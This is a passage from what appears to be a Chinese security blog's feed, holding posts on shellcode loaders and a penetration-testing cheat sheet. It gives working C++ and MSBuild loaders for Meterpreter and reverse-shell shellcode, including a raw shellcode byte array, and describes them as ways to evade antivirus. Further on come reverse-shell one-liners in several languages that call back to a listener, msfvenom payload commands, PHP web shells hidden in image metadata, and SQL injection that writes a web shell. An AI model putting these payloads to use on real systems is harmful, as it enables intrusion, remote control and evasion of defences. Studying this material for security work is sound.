pinfo = IntPtr.Zero;              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);              WaitForSingleObject(hThread, 0xFFFFFFFF);              return true;          &#125;         &#125;               ]]&gt;          &lt;/Code&gt;        &lt;/Task&gt;      &lt;/UsingTask&gt;    &lt;/Project&gt;</code></pre><h3 id="0x02-æ‰§è¡Œè½½è·"><a href="#0x02-æ‰§è¡Œè½½è·" class="headerlink" title="0x02 æ‰§è¡Œè½½è·"></a>0x02 æ‰§è¡Œè½½è·</h3><p>é¦–å…ˆåˆ©ç”¨MSFçš„<code>exploit/multi/handler</code>å¼€å¯ç›‘å¬ï¼Œç„¶åæˆ‘ä»¬åœ¨å—æ§ä¸»æœºä¸Šæ‰§è¡Œï¼š</p><pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319&gt;MSBuild D:/bad.xml</code></pre><p><img src="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/image-20201228133814195.png" alt="image-20201228133814195"></p><p>å›è¿Shellå¦‚ä¸‹ï¼š</p><p><img src="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/image-20201228133910387.png" alt="image-20201228133910387"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Shellcode </tag>
            
            <tag> æŒä¹…åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€šè¿‡èµ„æºæ–‡ä»¶åŠ è½½Shellcode</title>
      <link href="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/"/>
      <url>/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-ç”ŸæˆShellcode"><a href="#0x01-ç”ŸæˆShellcode" class="headerlink" title="0x01 ç”ŸæˆShellcode"></a>0x01 ç”ŸæˆShellcode</h3><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.133 LPORT=12345 &gt;payload.bin</code></pre><h3 id="0x02-æ·»åŠ èµ„æºæ–‡ä»¶"><a href="#0x02-æ·»åŠ èµ„æºæ–‡ä»¶" class="headerlink" title="0x02 æ·»åŠ èµ„æºæ–‡ä»¶"></a>0x02 æ·»åŠ èµ„æºæ–‡ä»¶</h3><p>å³é”®<code>èµ„æºæ–‡ä»¶&gt;æ·»åŠ &gt;èµ„æº</code>æ·»åŠ æˆ‘ä»¬åˆšåˆšç”Ÿæˆçš„Shellcode</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140005634.png" alt="image-20201225140005634"></p><p>é€‰æ‹©<code>å¯¼å…¥</code>ï¼Œæ·»åŠ <code>payload.bin</code></p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140229778.png" alt="image-20201225140229778"></p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140458518.png" alt="image-20201225140458518"></p><p>æˆ‘ä»¬å¯ä»¥åœ¨èµ„æºæ–‡ä»¶ä¸­çœ‹åˆ°æˆ‘ä»¬çš„binæ–‡ä»¶å·²ç»è¢«åŠ è½½</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140603313.png" alt="image-20201225140603313"></p><p>ä»£ç ï¼š</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &quot;resource.h&quot;int main()&#123;    // IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode    // METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin    HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD_BIN1), L&quot;PAYLOAD_BIN&quot;);    DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);    HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);    void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    memcpy(exec, shellcodeResouceData, shellcodeSize);    ((void(*)())exec)();    return  0;&#125;</code></pre><h3 id="0x03-ç¼–è¯‘å’ŒéªŒè¯"><a href="#0x03-ç¼–è¯‘å’ŒéªŒè¯" class="headerlink" title="0x03 ç¼–è¯‘å’ŒéªŒè¯"></a>0x03 ç¼–è¯‘å’ŒéªŒè¯</h3><p>ç¼–è¯‘æˆåŠŸæ²¡æœ‰ä»€ä¹ˆé—®é¢˜</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225141139791.png" alt="image-20201225141139791"></p><p>ç”Ÿæˆçš„exeæ”¾åˆ°è™šæ‹Ÿæœºé‡Œè¿è¡Œä¸€ä¸‹ï¼ŒæˆåŠŸ</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225141256996.png" alt="image-20201225141256996"></p><p>å…æ€ç‡â€¦â€¦å°†å°±å§ï¼Œæ¯•ç«Ÿå¹¶æ²¡æœ‰åšä»€ä¹ˆå…æ€çš„æªæ–½ï¼Œåªæ˜¯ä¸€ç§åŠ è½½shellcodeçš„æŠ€å·§è€Œå·²</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225141643919.png" alt="image-20201225141643919"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Shellcode </tag>
            
            <tag> åæ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¿å¼€Windows APIæ‰§è¡ŒShellcode</title>
      <link href="/2020/11/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/"/>
      <url>/2020/11/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/</url>
      
        <content type="html"><![CDATA[<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><pre><code class="c++">#pragma section(&quot;.text&quot;)// msvenom -p windows/x64/shell_reverse_tcp lhost=X lport=Y -f c__declspec(allocate(&quot;.text&quot;)) char goodcode[] =&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;&quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;&quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;&quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;&quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33&quot;&quot;\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00&quot;&quot;\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x38\x66\x41\x54&quot;&quot;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c&quot;&quot;\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff&quot;&quot;\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2&quot;&quot;\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48&quot;&quot;\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99&quot;&quot;\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63&quot;&quot;\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57&quot;&quot;\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44&quot;&quot;\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6&quot;&quot;\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff&quot;&quot;\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5&quot;&quot;\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff&quot;&quot;\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48&quot;&quot;\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13&quot;&quot;\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&quot;;int main()&#123;    (*(void(*)())(&amp;goodcode))();&#125;</code></pre><h3 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h3><p>è¿™ç§Shellcodeçš„åŠ è½½æ–¹å¼å¯ä»¥åœ¨ç¼–è¯‘æ—¶å°†Shellcodeå®Œå…¨åˆ†é…åˆ°<code>.text</code>æ®µã€‚æ­¤å¤–å°†åŒ…å«Shellcodeçš„æ•°ç»„è½¬æ¢ä¸ºå‡½æ•°æŒ‡é’ˆå¹¶è°ƒç”¨ï¼Œä»è€Œé¿å…äº†è°ƒç”¨<code>CreateThread</code>ä¹‹ç±»çš„å¸¸ç”¨äºè·³è½¬è‡³Shellcodeçš„Windows APIã€‚</p><p>è¿™ç§æ–¹å¼å¯ä»¥æœ‰æ•ˆé¿å¼€ä¸€äº›æ€æ¯’è½¯ä»¶çš„æŸ¥æ€ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Shellcode </tag>
            
            <tag> åæ¸—é€ </tag>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¸—é€æµ‹è¯•é€ŸæŸ¥è¡¨</title>
      <link href="/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/"/>
      <url>/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¾¦å¯Ÿ"><a href="#ä¾¦å¯Ÿ" class="headerlink" title="ä¾¦å¯Ÿ"></a>ä¾¦å¯Ÿ</h2><h3 id="å­˜æ´»IPæ‰«æ"><a href="#å­˜æ´»IPæ‰«æ" class="headerlink" title="å­˜æ´»IPæ‰«æ"></a>å­˜æ´»IPæ‰«æ</h3><pre><code class="shell">nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep &quot;/open&quot; | cut -d &quot; &quot; -f 2 &gt; exposed-services-ips</code></pre><h3 id="æ‰¹é‡Ping"><a href="#æ‰¹é‡Ping" class="headerlink" title="æ‰¹é‡Ping"></a>æ‰¹é‡Ping</h3><pre><code class="shell">#!/bin/bashfor lastOctet in &#123;1..254&#125;; do     ping -c 1 10.0.0.$lastOctet | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &amp;done</code></pre><h3 id="å•ä¸ªç«¯å£æ£€æŸ¥"><a href="#å•ä¸ªç«¯å£æ£€æŸ¥" class="headerlink" title="å•ä¸ªç«¯å£æ£€æŸ¥"></a>å•ä¸ªç«¯å£æ£€æŸ¥</h3><pre><code class="shell">nc -v $TARGET 80telnet $TARGET 80curl -vX $TARGET</code></pre><h3 id="å°‘é‡ç«¯å£æ¢æµ‹"><a href="#å°‘é‡ç«¯å£æ¢æµ‹" class="headerlink" title="å°‘é‡ç«¯å£æ¢æµ‹"></a>å°‘é‡ç«¯å£æ¢æµ‹</h3><pre><code class="shell">for x in 7000 8000 9000; do nmap -Pn â€“host_timeout 201 â€“max-retries 0 -p $x 1.1.1.1; done</code></pre><h3 id="ncç«¯å£æ‰«æ"><a href="#ncç«¯å£æ‰«æ" class="headerlink" title="ncç«¯å£æ‰«æ"></a>ncç«¯å£æ‰«æ</h3><pre><code class="shell">nc -nvv -w 1 -z host 1000-2000nc -nv -u -z -w 1 host 160-162</code></pre><h3 id="Masscanç«¯å£æ‰«æ"><a href="#Masscanç«¯å£æ‰«æ" class="headerlink" title="Masscanç«¯å£æ‰«æ"></a>Masscanç«¯å£æ‰«æ</h3><pre><code class="shell">masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0</code></pre><h3 id="DNSä¿¡æ¯æŸ¥è¯¢-å­åŸŸåçˆ†ç ´"><a href="#DNSä¿¡æ¯æŸ¥è¯¢-å­åŸŸåçˆ†ç ´" class="headerlink" title="DNSä¿¡æ¯æŸ¥è¯¢&#x2F;å­åŸŸåçˆ†ç ´"></a>DNSä¿¡æ¯æŸ¥è¯¢&#x2F;å­åŸŸåçˆ†ç ´</h3><pre><code class="shell">whois domain.comdig &#123;a|txt|ns|mx&#125; domain.comdig &#123;a|txt|ns|mx&#125; domain.com @ns1.domain.comhost -t &#123;a|txt|ns|mx&#125; megacorpone.comhost -a megacorpone.comhost -l megacorpone.com ns1.megacorpone.comdnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.comdnsenum domain.comnslookup -&gt; set type=any -&gt; ls -d domain.comfor sub in $(cat subdomains.txt);do host $sub.domain.com|grep &quot;has.address&quot;;done</code></pre><h3 id="NFS-Exported-Shares"><a href="#NFS-Exported-Shares" class="headerlink" title="NFS Exported Shares"></a>NFS Exported Shares</h3><pre><code class="shell">#åˆ—å‡ºNFSå…±äº«ï¼Œå¦‚æœå­˜åœ¨&#39;rw,no_root_squash&#39;ï¼Œå¯ä¸Šä¼ å¹¶æ‰§è¡Œsid-shellshowmount -e 192.168.110.102chown root:root sid-shell; chmod +s sid-shell</code></pre><h3 id="Kerberosæšä¸¾"><a href="#Kerberosæšä¸¾" class="headerlink" title="Kerberosæšä¸¾"></a>Kerberosæšä¸¾</h3><pre><code class="shell"># usersnmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&#39;test&#39;</code></pre><h3 id="Webæ¼æ´æ‰«æï¼ˆç®€æ˜“ï¼‰"><a href="#Webæ¼æ´æ‰«æï¼ˆç®€æ˜“ï¼‰" class="headerlink" title="Webæ¼æ´æ‰«æï¼ˆç®€æ˜“ï¼‰"></a>Webæ¼æ´æ‰«æï¼ˆç®€æ˜“ï¼‰</h3><pre><code class="shell">target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobustertarget=10.0.0.1; nikto -h http://$target:80 | tee $target-niktotarget=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum</code></pre><h3 id="RPC-NetBios-SMBæ¢æµ‹"><a href="#RPC-NetBios-SMBæ¢æµ‹" class="headerlink" title="RPC&#x2F;NetBios&#x2F;SMBæ¢æµ‹"></a>RPC&#x2F;NetBios&#x2F;SMBæ¢æµ‹</h3><pre><code class="shell">rpcinfo -p $TARGETnbtscan $TARGET#list sharessmbclient -L //$TARGET -U &quot;&quot;# null sessionrpcclient -U &quot;&quot; $TARGETsmbclient -L //$TARGETenum4linux $TARGET</code></pre><h3 id="SNMPæ¢æµ‹"><a href="#SNMPæ¢æµ‹" class="headerlink" title="SNMPæ¢æµ‹"></a>SNMPæ¢æµ‹</h3><pre><code class="shell"># Windows User Accountssnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25# Windows Running Programssnmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2# Windows Hostnamesnmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5# Windows Share Informationsnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1# Windows Share Informationsnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27# Windows TCP Portssnmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3# Software Namesnmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2# brute-force community stringsonesixtyone -i snmp-ips.txt -c community.txtsnmp-check $TARGET</code></pre><h3 id="SMTPæ¢æµ‹"><a href="#SMTPæ¢æµ‹" class="headerlink" title="SMTPæ¢æµ‹"></a>SMTPæ¢æµ‹</h3><pre><code class="shell">smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150</code></pre><h3 id="åŸŸä¿¡æ¯æ¢æµ‹"><a href="#åŸŸä¿¡æ¯æ¢æµ‹" class="headerlink" title="åŸŸä¿¡æ¯æ¢æµ‹"></a>åŸŸä¿¡æ¯æ¢æµ‹</h3><pre><code class="shell"># current domain info[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()# domain trusts([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()# current forest info[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()# get forest trust relationships([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&#39;Forest&#39;, &#39;forest-of-interest.local&#39;)))).GetAllTrustRelationships()# get DCs of a domainnltest /dclist:offense.localnet group &quot;domain controllers&quot; /domain# get DC for currently authenticated sessionnltest /dsgetdc:offense.local# get domain trusts from cmd shellnltest /domain_trusts# get user infonltest /user:&quot;spotless&quot;# get DC for currently authenticated sessionset l# get domain name and DC the user authenticated toklist# get all logon sessions. Includes NTLM authenticated sessionsklist sessions# kerberos tickets for the sessionklist# cached krbtgtklist tgt# whoami on older Windows systemsset u# find DFS shares with ADModuleGet-ADObject -filter * -SearchBase &quot;CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot; | select name# find DFS shares with ADSI$s=[adsisearcher]&#39;(name=*)&#39;; $s.SearchRoot = [adsi]&quot;LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot;; $s.FindAll() | % &#123;$_.properties.name&#125;# check if spooler service is running on a hostpowershell ls &quot;\\dc01\pipe\spoolss&quot;</code></pre><h3 id="Powershellä¸‹çš„ç«¯å£ç›‘å¬"><a href="#Powershellä¸‹çš„ç«¯å£ç›‘å¬" class="headerlink" title="Powershellä¸‹çš„ç«¯å£ç›‘å¬"></a>Powershellä¸‹çš„ç«¯å£ç›‘å¬</h3><pre><code class="powershell"># Start listener on port 443$listener = [System.Net.Sockets.TcpListener]443; $listener.Start(); while($true)&#123;    $client = $listener.AcceptTcpClient();    Write-Host $client.client.RemoteEndPoint &quot;connected!&quot;;    $client.Close();    start-sleep -seconds 1;&#125;</code></pre><h2 id="åå¼¹Shell"><a href="#åå¼¹Shell" class="headerlink" title="åå¼¹Shell"></a>åå¼¹Shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><pre><code class="shell">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></pre><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><pre><code class="shell">perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;#URL-Encoded Perl: Linuxecho%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew</code></pre><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre><code class="shell">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><pre><code class="shell">php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><pre><code class="shell">ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code></pre><h3 id="Netcat-without-e"><a href="#Netcat-without-e" class="headerlink" title="Netcat without -e"></a>Netcat without -e</h3><pre><code class="shell">#1rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.0.0.1 1234 &gt; /tmp/f#2nc localhost 443 | /bin/sh | nc localhost 444</code></pre><h3 id="Telnet-Linux"><a href="#Telnet-Linux" class="headerlink" title="Telnet(Linux)"></a>Telnet(Linux)</h3><pre><code class="shell">telnet localhost 443 | /bin/sh | telnet localhost 444</code></pre><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><pre><code class="shell">r = Runtime.getRuntime(); p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]); p.waitFor();</code></pre><h3 id="XTerm"><a href="#XTerm" class="headerlink" title="XTerm"></a>XTerm</h3><pre><code class="shell">xterm -display 10.0.0.1:1</code></pre><h3 id="éäº¤äº’å¼shellå‡çº§"><a href="#éäº¤äº’å¼shellå‡çº§" class="headerlink" title="éäº¤äº’å¼shellå‡çº§"></a>éäº¤äº’å¼shellå‡çº§</h3><pre><code class="shell">python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;/bin/busybox sh</code></pre><p>[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;]</p><h2 id="JDWP-RCE"><a href="#JDWP-RCE" class="headerlink" title="JDWP RCE"></a>JDWP RCE</h2><pre><code class="shell">print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&quot;whoami&quot;).getInputStream())).readLine())</code></pre><p>[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;]</p><h2 id="æœ¨é©¬ç”Ÿæˆ"><a href="#æœ¨é©¬ç”Ÿæˆ" class="headerlink" title="æœ¨é©¬ç”Ÿæˆ"></a>æœ¨é©¬ç”Ÿæˆ</h2><h3 id="msfç”Ÿæˆæœ‰æ•ˆè½½è·"><a href="#msfç”Ÿæˆæœ‰æ•ˆè½½è·" class="headerlink" title="msfç”Ÿæˆæœ‰æ•ˆè½½è·"></a>msfç”Ÿæˆæœ‰æ•ˆè½½è·</h3><pre><code class="shell">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b &quot;\x00\x0a\x0d&quot; -e x86/shikata_ga_nai</code></pre><h3 id="Linuxä¸‹ç¼–è¯‘cä»£ç "><a href="#Linuxä¸‹ç¼–è¯‘cä»£ç " class="headerlink" title="Linuxä¸‹ç¼–è¯‘cä»£ç "></a>Linuxä¸‹ç¼–è¯‘cä»£ç </h3><pre><code class="shell"># Windowsi686-w64-mingw32-gcc source.c -lws2_32 -o out.exe# Linuxgcc -m32|-m64 -o output source.c</code></pre><h3 id="Windowsä¸‹ç¼–è¯‘ä¸º-obj"><a href="#Windowsä¸‹ç¼–è¯‘ä¸º-obj" class="headerlink" title="Windowsä¸‹ç¼–è¯‘ä¸º.obj"></a>Windowsä¸‹ç¼–è¯‘ä¸º.obj</h3><pre><code class="shell"># https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=Dnasm -f win64 .\hello.asm -o .\hello.obj# http://www.godevtool.com/Golink.zipGoLink.exe -o .\hello.exe .\hello.obj</code></pre><h3 id="pyæ–‡ä»¶è½¬æ¢exe"><a href="#pyæ–‡ä»¶è½¬æ¢exe" class="headerlink" title="pyæ–‡ä»¶è½¬æ¢exe"></a>pyæ–‡ä»¶è½¬æ¢exe</h3><pre><code class="shell">python pyinstaller.py --onefile convert-to-exe.py</code></pre><h3 id="ç”Ÿæˆæœ‰æ•ˆè½½è·æ¨¡å¼å¹¶è®¡ç®—åç§»é‡"><a href="#ç”Ÿæˆæœ‰æ•ˆè½½è·æ¨¡å¼å¹¶è®¡ç®—åç§»é‡" class="headerlink" title="ç”Ÿæˆæœ‰æ•ˆè½½è·æ¨¡å¼å¹¶è®¡ç®—åç§»é‡"></a>ç”Ÿæˆæœ‰æ•ˆè½½è·æ¨¡å¼å¹¶è®¡ç®—åç§»é‡</h3><pre><code class="shell">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE</code></pre><h2 id="WEBæ–‡ä»¶ä¸Šä¼ "><a href="#WEBæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="WEBæ–‡ä»¶ä¸Šä¼ "></a>WEBæ–‡ä»¶ä¸Šä¼ </h2><h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><pre><code>file.php -&gt; file.jpgfile.php -&gt; file.php.jpgfile.asp -&gt; file.asp;.jpgfile.gif (contains php code, but starts with string GIF/GIF98)00%file.jpg with php backdoor in exif (see below).jpg -&gt; proxy intercept -&gt; rename to .php</code></pre><h3 id="åˆ¶ä½œå›¾ç‰‡é©¬"><a href="#åˆ¶ä½œå›¾ç‰‡é©¬" class="headerlink" title="åˆ¶ä½œå›¾ç‰‡é©¬"></a>åˆ¶ä½œå›¾ç‰‡é©¬</h3><p>å›¾ç‰‡æ–‡ä»¶åé—¨è¯­å¥æ³¨å…¥</p><pre><code class="shell">exiv2 -c&#39;A &quot;&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;!&#39; backdoor.jpegexiftool â€œ-comment&lt;=back.phpâ€ back.png</code></pre><h3 id="htaccessæ–‡ä»¶é…ç½®"><a href="#htaccessæ–‡ä»¶é…ç½®" class="headerlink" title=".htaccessæ–‡ä»¶é…ç½®"></a>.htaccessæ–‡ä»¶é…ç½®</h3><pre><code class="shell">#ä¸Šä¼ .htaccessæ–‡ä»¶å°†.blahæ–‡ä»¶è§£æä¸º.phpæ–‡ä»¶AddType application/x-httpd-php .blah</code></pre><h3 id="SQLæ³¨å…¥ä¸Šä¼ WebShell"><a href="#SQLæ³¨å…¥ä¸Šä¼ WebShell" class="headerlink" title="SQLæ³¨å…¥ä¸Šä¼ WebShell"></a>SQLæ³¨å…¥ä¸Šä¼ WebShell</h3><p>æ‰‹å·¥ï¼š</p><pre><code># Assumed 3 columnshttp://target/index.php?vulnParam=0&#39; UNION ALL SELECT 1,&quot;&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;,2,3 INTO OUTFILE &quot;c:/evil.php&quot;-- uMj</code></pre><p>SQLMap</p><pre><code class="shell"># sqlmap; post-request - captured request via Burp Proxy via Save Item to File.sqlmap -r post-request -p item --level=3 --risk=2 --dbms=mysql --os-shell --threads 